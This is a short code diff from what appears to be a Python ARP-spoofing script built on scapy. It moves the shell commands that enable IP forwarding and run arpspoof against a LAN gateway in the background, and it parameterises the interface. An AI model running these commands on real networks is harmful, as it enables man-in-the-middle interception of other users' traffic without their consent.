@@ -19,8 +19,7 @@ from scapy.layers.inet import IP
 
 import netifaces as ni
 
-os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
-os.system("arpspoof -i eth0 192.168.1.1 > /dev/null 2>&1 &")
+ip_gateway = "192.168.1.1"
 
 default_interface = "eth0"
 ip_exclude = "192.168.1.201"
@@ -35,6 +34,9 @@ if default_interface == "":
         print("[*] User Requests Shutdown")
         print("[*] Exiting")
         sys.exit(1)
+
+os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
+os.system("arpspoof -i " + interface + " " + ip_gateway + " > /dev/null 2>&1 &")
 
 # get local ip address
 ni.ifaddresses(interface)
